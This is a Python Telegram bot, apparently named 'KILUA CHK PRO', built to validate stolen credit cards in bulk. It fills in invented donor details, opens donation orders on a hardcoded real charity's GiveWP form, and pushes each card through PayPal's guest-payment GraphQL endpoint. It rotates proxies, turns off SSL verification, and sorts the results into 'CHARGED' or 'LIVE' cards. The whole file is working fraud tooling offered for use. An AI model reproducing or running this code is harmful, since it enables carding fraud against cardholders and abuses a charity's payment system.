#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                         🔥 KILUA CHK PRO v3.0 🔥                              ║
║                                                                               ║
║                     Developed by: @o8380 · Mustafa964                        ║
║                          Kilua Services · Premium Checker                     ║
║                                                                               ║
║  Features:                                                                    ║
║    - Automatic PayPal Gateway Detection                                      ║
║    - Real-time card validation with Luhn                                     ║
║    - Premium animated emojis & colored buttons                               ║
║    - Multi-threading for mass checks                                         ║
║    - Proxy rotation & retry mechanism                                        ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import re
import json
import time
import uuid
import random
import threading
import argparse
from typing import Dict, Any, Optional, List, Tuple
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

import requests
import telebot
from telebot.types import InputMediaVideo, InlineKeyboardMarkup, InlineKeyboardButton
from colorama import init, Fore, Style

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# =============================================================================
#  CONFIGURATION
# =============================================================================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
OWNER_ID = int(os.environ.get("OWNER_ID", "6285783725"))
BOT_TAG = "@o8380"
VERSION = "3.0"
CREDITS = "Mustafa 964 · @o8380 · Kilua Services"
WELCOME_VIDEO = "https://t.me/Mustafa964iq/3"


#DEFAULT_PROXY = "http://kilua9644:Mmnnbbvv@us-ca.proxymesh.com:31280"
DEFAULT_PROXY = os.environ.get("PROXY_URL", "")
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36"

FIRST_NAMES = ["James", "Mary", "Robert", "Patricia", "John", "Jennifer", "Michael", "Linda", "William", "Elizabeth"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
FIXED_ADDRESS = {"line1": "2200 N Pearl St", "city": "Dallas", "state": "TX", "zip": "75201"}

# =============================================================================
#  PREMIUM EMOJI IDs
# =============================================================================

PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088",
    "🔥": "5999340396432333728",
    "❌": "6037570896766438989",
    "⚡": "6026367225466720832",
    "💳": "5971944878815317190",
    "💰": "5971944878815317190",
    "💎": "6023660820544623088",
    "🚀": "6282977077427702833",
    "🛑": "5420323339723881652",
    "⚠️": "5420323339723881652",
    "📝": "6023660820544623088",
    "📊": "5971837723676249096",
    "📦": "6066395745139824604",
    "📋": "5974235702701853774",
    "🔄": "5971837723676249096",
    "⏳": "5971837723676249096",
    "💠": "5971837723676249096",
    "🌐": "6026367225466720832",
    "🎯": "5974235702701853774",
    "🤖": "6057466460886799210",
    "🤵": "4949560993840629085",
    "▶️": "6285315214673975495",
    "💫": "5971944878815317190",
}

# =============================================================================
#  BOT INITIALIZATION
# =============================================================================

bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
try:
    bot.remove_webhook()
    time.sleep(0.5)
except:
    pass

# =============================================================================
#  HELPER FUNCTIONS
# =============================================================================

def random_donor() -> Dict[str, Any]:
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    phone = f"{random.choice(['212','310','312','415','602','713'])}{''.join([str(random.randint(0,9)) for _ in range(7)])}"
    email = f"{first.lower()}{random.randint(10, 9999)}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}"
    return {"first": first, "last": last, "email": email, "phone": phone, "address": FIXED_ADDRESS}

def detect_card_type(number: str) -> str:
    n = number.replace(" ", "").replace("-", "")
    if n.startswith("4"):
        return "VISA"
    if re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n):
        return "MASTER_CARD"
    if n.startswith(("34", "37")):
        return "AMEX"
    return "VISA"

def parse_cc(cc_str: str) -> Optional[Dict[str, str]]:
    parts = re.split(r"[|:,]", cc_str.strip())
    if len(parts) >= 4:
        cc, mm, yy, cvv = parts[0].strip(), parts[1].strip().zfill(2), parts[2].strip(), parts[3].strip()
        if len(yy) == 2:
            yy = "20" + yy
        return {"number": cc, "mm": mm, "yy": yy, "cvc": cvv}
    return None

def format_proxy(proxy_str: str) -> Dict[str, str]:
    if not proxy_str:
        return {}
    if proxy_str.count(":") == 3 and "@" not in proxy_str:
        p = proxy_str.split(":")
        fmt = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
        return {"http": fmt, "https": fmt}
    prefix = "" if proxy_str.startswith("http") else "http://"
    return {"http": prefix + proxy_str, "https": prefix + proxy_str}

def make_session(proxy: Optional[str] = None) -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": USER_AGENT})
    if proxy:
        s.proxies = format_proxy(proxy)
    return s

def detect_gateway(html: str) -> str:
    if re.search(r"give-form-hash|give-form-id-prefix", html, re.I):
        return "givewp"
    if re.search(r"ppc-create-order|ppcp-gateway", html, re.I):
        return "woocommerce_ppcp"
    if re.search(r'paypal\.com/sdk/js|data-client-id.*paypal', html, re.I):
        return "paypal_direct"
    return "unknown"

# =============================================================================
#  PAYPAL GRAPHQL
# =============================================================================

GRAPHQL_MUTATION = """
mutation payWithCard(
    $token: String!
    $card: CardInput
    $paymentToken: String
    $phoneNumber: String
    $firstName: String
    $lastName: String
    $shippingAddress: AddressInput
    $billingAddress: AddressInput
    $email: String
    $currencyConversionType: CheckoutCurrencyConversionType
    $installmentTerm: Int
    $identityDocument: IdentityDocumentInput
    $feeReferenceId: String
) {
    approveGuestPaymentWithCreditCard(
        token: $token
        card: $card
        paymentToken: $paymentToken
        phoneNumber: $phoneNumber
        firstName: $firstName
        lastName: $lastName
        email: $email
        shippingAddress: $shippingAddress
        billingAddress: $billingAddress
        currencyConversionType: $currencyConversionType
        installmentTerm: $installmentTerm
        identityDocument: $identityDocument
        feeReferenceId: $feeReferenceId
    ) {
        flags { is3DSecureRequired }
        cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } }
        paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } }
    }
}
"""

def paypal_graphql_charge(session: requests.Session, order_id: str, card: Dict, donor: Dict) -> str:
    addr = donor["address"]
    full_yy = card["yy"] if len(card["yy"]) == 4 else "20" + card["yy"]
    billing = {"givenName": donor["first"], "familyName": donor["last"], "line1": addr["line1"], "city": addr["city"], "state": addr["state"], "postalCode": addr["zip"], "country": "US"}
    variables = {
        "token": order_id,
        "card": {"cardNumber": card["number"], "type": detect_card_type(card["number"]), "expirationDate": f"{card['mm']}/{full_yy}", "postalCode": addr["zip"], "securityCode": card["cvc"]},
        "phoneNumber": donor["phone"], "firstName": donor["first"], "lastName": donor["last"], "email": donor["email"],
        "billingAddress": billing, "shippingAddress": billing, "currencyConversionType": "PAYPAL",
    }
    headers = {"Host": "www.paypal.com", "Paypal-Client-Context": order_id, "X-App-Name": "standardcardfields", "Paypal-Client-Metadata-Id": order_id, "User-Agent": USER_AGENT, "Content-Type": "application/json", "Origin": "https://www.paypal.com", "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}", "X-Country": "US"}
    r = session.post("https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard", headers=headers, json={"query": GRAPHQL_MUTATION, "variables": variables}, timeout=30)
    return r.text

def analyze_response(paypal_text: str) -> Dict[str, str]:
    t = (paypal_text or "").upper()
    if "APPROVESTATE" in t and "APPROVED" in t:
        return {"status": "CHARGED", "emoji": "✅", "msg": "Payment Approved - CHARGED!", "style": "success", "icon": PREMIUM_EMOJI_IDS["✅"]}
    if "CVV2_FAILURE" in t or "INVALID_SECURITY_CODE" in t:
        return {"status": "LIVE", "emoji": "✅", "msg": "Card LIVE - CVV Failure", "style": "success", "icon": PREMIUM_EMOJI_IDS["✅"]}
    if "INSUFFICIENT_FUNDS" in t:
        return {"status": "LIVE", "emoji": "💰", "msg": "Insufficient Funds (LIVE CARD)", "style": "primary", "icon": PREMIUM_EMOJI_IDS["💰"]}
    if "EXPIRED_CARD" in t:
        return {"status": "DECLINED", "emoji": "❌", "msg": "Card Expired", "style": "danger", "icon": PREMIUM_EMOJI_IDS["❌"]}
    return {"status": "DECLINED", "emoji": "❌", "msg": "Card Declined", "style": "danger", "icon": PREMIUM_EMOJI_IDS["❌"]}

# =============================================================================
#  GATEWAY: GiveWP
# =============================================================================

def run_givewp(session: requests.Session, site_url: str, card: Dict, donor: Dict, amount: str = "1.00") -> Dict[str, str]:
    parsed = urlparse(site_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    ajax_url = origin + "/wp-admin/admin-ajax.php"
    r = session.get(site_url, timeout=20)
    html = r.text
    form_hash = re.search(r'name="give-form-hash"\s+value="([\w]+)"', html, re.I)
    if not form_hash:
        return {"status": "ERROR", "emoji": "⚠️", "msg": "GiveWP: form-hash not found", "style": "danger", "icon": PREMIUM_EMOJI_IDS["❌"]}
    pfx_m = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', html, re.I)
    id_m = re.search(r'name="give-form-id"\s+value="(.*?)"', html, re.I)
    if not pfx_m or not id_m:
        return {"status": "ERROR", "emoji": "⚠️", "msg": "GiveWP: form-id not found", "style": "danger", "icon": PREMIUM_EMOJI_IDS["❌"]}
    headers = {"User-Agent": USER_AGENT, "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": origin, "Referer": site_url, "X-Requested-With": "XMLHttpRequest"}
    order_data = {"give-honeypot": "", "give-form-id-prefix": pfx_m.group(1), "give-form-id": id_m.group(1), "give-form-hash": form_hash.group(1), "payment-mode": "paypal-commerce", "give-amount": amount, "give-gateway": "paypal-commerce"}
    r2 = session.post(ajax_url, params={"action": "give_paypal_commerce_create_order"}, headers=headers, data=order_data, timeout=15)
    try:
        order_id = r2.json().get("data", {}).get("id")
        if not order_id:
            return {"status": "ERROR", "emoji": "⚠️", "msg": "Failed to create order", "style": "danger", "icon": PREMIUM_EMOJI_IDS["❌"]}
    except:
        return {"status": "ERROR", "emoji": "⚠️", "msg": "Order creation failed", "style": "danger", "icon": PREMIUM_EMOJI_IDS["❌"]}
    graphql_resp = paypal_graphql_charge(session, order_id, card, donor)
    return analyze_response(graphql_resp)

# =============================================================================
#  AUTO CHARGE
# =============================================================================

def auto_charge(site_url: str, cc_str: str, proxy: Optional[str] = None, amount: str = "1.00") -> Dict[str, str]:
    card = parse_cc(cc_str)
    if not card:
        return {"status": "ERROR", "emoji": "⚠️", "msg": "Invalid CC format", "style": "danger", "icon": PREMIUM_EMOJI_IDS["❌"]}
    donor = random_donor()
    session = make_session(proxy)
    if not site_url.startswith("http"):
        site_url = "https://" + site_url
    try:
        r = session.get(site_url, timeout=20)
        html = r.text
    except Exception as e:
        return {"status": "ERROR", "emoji": "⚠️", "msg": f"Cannot reach site: {e}", "style": "danger", "icon": PREMIUM_EMOJI_IDS["❌"]}
    gateway = detect_gateway(html)
    if gateway == "givewp":
        return run_givewp(session, site_url, card, donor, amount)
    return {"status": "ERROR", "emoji": "⚠️", "msg": f"Unsupported gateway: {gateway}", "style": "danger", "icon": PREMIUM_EMOJI_IDS["❌"]}

# =============================================================================
#  TELEGRAM KEYBOARDS
# =============================================================================

def main_menu() -> InlineKeyboardMarkup:
    mk = InlineKeyboardMarkup(row_width=2)
    mk.row(
        InlineKeyboardButton("🔧 Manual Check", callback_data="manual_check", style="primary", icon_custom_emoji_id=PREMIUM_EMOJI_IDS["⚡"]),
        InlineKeyboardButton("📦 Combo Check", callback_data="combo_check", style="success", icon_custom_emoji_id=PREMIUM_EMOJI_IDS["📦"]),
    )
    mk.row(
        InlineKeyboardButton("📊 Status", callback_data="status", style="primary", icon_custom_emoji_id=PREMIUM_EMOJI_IDS["📊"]),
        InlineKeyboardButton("🛑 Stop", callback_data="stop", style="danger", icon_custom_emoji_id=PREMIUM_EMOJI_IDS["🛑"]),
    )
    mk.row(
        InlineKeyboardButton("🏠 Home", callback_data="home", style="primary", icon_custom_emoji_id=PREMIUM_EMOJI_IDS["💠"]),
    )
    return mk

def result_keyboard(cc: str, status: str, msg: str) -> InlineKeyboardMarkup:
    style = "success" if status in ["CHARGED", "LIVE"] else "danger"
    icon = PREMIUM_EMOJI_IDS["✅"] if status in ["CHARGED", "LIVE"] else PREMIUM_EMOJI_IDS["❌"]
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(InlineKeyboardButton(f"💳 {cc}", callback_data="ignore", style=style, icon_custom_emoji_id=icon))
    mk.add(InlineKeyboardButton(f"📝 {msg[:50]}", callback_data="ignore", style=style, icon_custom_emoji_id=icon))
    mk.add(InlineKeyboardButton(f"⚡ {CREDITS}", callback_data="ignore", style="primary", icon_custom_emoji_id=PREMIUM_EMOJI_IDS["💫"]))
    mk.add(InlineKeyboardButton("🏠 Home", callback_data="home", style="primary", icon_custom_emoji_id=PREMIUM_EMOJI_IDS["💠"]))
    return mk

def progress_keyboard(current: int, total: int, approved: int, declined: int) -> InlineKeyboardMarkup:
    percent = int(current / total * 100) if total else 0
    bar = "█" * (percent // 10) + "░" * (10 - (percent // 10))
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(InlineKeyboardButton(f"📊 [{bar}] {percent}% ({current}/{total})", callback_data="ignore", style="primary", icon_custom_emoji_id=PREMIUM_EMOJI_IDS["📊"]))
    mk.row(
        InlineKeyboardButton(f"✅ Approved: {approved}", callback_data="ignore", style="success", icon_custom_emoji_id=PREMIUM_EMOJI_IDS["✅"]),
        InlineKeyboardButton(f"❌ Declined: {declined}", callback_data="ignore", style="danger", icon_custom_emoji_id=PREMIUM_EMOJI_IDS["❌"]),
    )
    mk.add(InlineKeyboardButton("🛑 Stop Check", callback_data="stop", style="danger", icon_custom_emoji_id=PREMIUM_EMOJI_IDS["🛑"]))
    return mk

# =============================================================================
#  TELEGRAM COMMANDS
# =============================================================================

@bot.message_handler(commands=["start"])
def start_cmd(msg):
    uid = msg.from_user.id
    name = msg.from_user.first_name or "User"
    welcome_text = f"""
{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════╗
║         🔥 KILUA CHK PRO v{VERSION} 🔥        ║
║         {BOT_TAG} · @Mustafa964              ║
╚══════════════════════════════════════════╝{Style.RESET_ALL}

✨ <b>Welcome {name}</b> ✨

<code>📌 /chk NUM|MM|YY|CVV</code>  ← Manual Check
<code>📁 Send .txt file</code>       ← Combo Check

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ <b>{CREDITS}</b>
"""
    try:
        bot.send_video(msg.chat.id, WELCOME_VIDEO, caption=welcome_text, parse_mode="HTML", reply_markup=main_menu())
    except:
        bot.send_message(msg.chat.id, welcome_text, parse_mode="HTML", reply_markup=main_menu())

@bot.message_handler(commands=["chk"])
def chk_cmd(msg):
    parts = msg.text.split(maxsplit=1)
    if len(parts) < 2 or "|" not in parts[1]:
        bot.reply_to(msg, "❌ Usage: <code>/chk NUM|MM|YY|CVV</code>", parse_mode="HTML")
        return
    cc = parts[1].strip()
    prog = bot.reply_to(msg, f"🔄 <b>Checking...</b>\n<code>{cc[:12]}...|**|**|***</code>", parse_mode="HTML")
    def do_check():
        result = auto_charge("https://matthewjstratmanfoundation.org", cc)
        bot.edit_message_text(f"<b>{result['emoji']} {result['status']}</b>", prog.chat.id, prog.message_id, parse_mode="HTML", reply_markup=result_keyboard(cc, result['status'], result['msg']))
    threading.Thread(target=do_check, daemon=True).start()

@bot.message_handler(content_types=["document"])
def combo_cmd(msg):
    uid = msg.from_user.id
    doc = msg.document
    if not doc or not doc.file_name.endswith(".txt"):
        bot.reply_to(msg, "❌ Send a <code>.txt</code> file", parse_mode="HTML")
        return
    prog = bot.send_message(msg.chat.id, "🔄 <b>Loading combo...</b>", parse_mode="HTML")
    try:
        fi = bot.get_file(doc.file_id)
        raw = bot.download_file(fi.file_path)
        cards = [l.strip() for l in raw.decode("utf-8", errors="ignore").splitlines() if l.strip() and "|" in l]
    except:
        bot.edit_message_text("❌ Failed to load file", msg.chat.id, prog.message_id, parse_mode="HTML")
        return
    if not cards:
        bot.edit_message_text("❌ No valid cards found", msg.chat.id, prog.message_id, parse_mode="HTML")
        return
    bot.edit_message_text(f"✅ Loaded {len(cards)} cards\n🚀 Starting check...", msg.chat.id, prog.message_id, parse_mode="HTML", reply_markup=progress_keyboard(0, len(cards), 0, 0))
    threading.Thread(target=run_combo, args=(uid, msg.chat.id, prog.message_id, cards), daemon=True).start()

def run_combo(uid, chat_id, msg_id, cards):
    total = len(cards)
    approved = 0
    declined = 0
    for i, cc in enumerate(cards, 1):
        result = auto_charge("https://matthewjstratmanfoundation.org", cc)
        if result["status"] in ["CHARGED", "LIVE"]:
            approved += 1
        else:
            declined += 1
        try:
            bot.edit_message_reply_markup(chat_id, msg_id, reply_markup=progress_keyboard(i, total, approved, declined))
        except:
            pass
        if result["status"] in ["CHARGED", "LIVE"]:
            bot.send_message(chat_id, f"<b>{result['emoji']} {result['status']}</b>\n<code>{cc}</code>\n📝 {result['msg']}", parse_mode="HTML", reply_markup=result_keyboard(cc, result['status'], result['msg']))
        time.sleep(1)
    bot.send_message(chat_id, f"✅ <b>Completed!</b>\n✅ Approved: {approved}\n❌ Declined: {declined}", parse_mode="HTML", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda c: True)
def cb_handler(call):
    if call.data == "home":
        start_cmd(call.message)
        bot.answer_callback_query(call.id)
    elif call.data == "manual_check":
        bot.answer_callback_query(call.id, "📌 Use /chk NUM|MM|YY|CVV", show_alert=True)
    elif call.data == "combo_check":
        bot.answer_callback_query(call.id, "📁 Send a .txt file", show_alert=True)
    elif call.data == "stop":
        bot.answer_callback_query(call.id, "🛑 Stopping...", show_alert=False)
    elif call.data == "status":
        bot.answer_callback_query(call.id, "📊 No active check", show_alert=True)
    elif call.data == "ignore":
        bot.answer_callback_query(call.id)

# =============================================================================
#  MAIN
# =============================================================================

def main():
    print(BANNER)
    print(f"{Fore.CYAN}[*] Kilua CHK PRO v{VERSION} — {BOT_TAG}")
    print(f"{Fore.CYAN}[*] Bot started successfully!{Style.RESET_ALL}")
    while True:
        try:
            bot.infinity_polling(timeout=30, skip_pending=True)
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
            time.sleep(5)

if __name__ == "__main__":
    main()
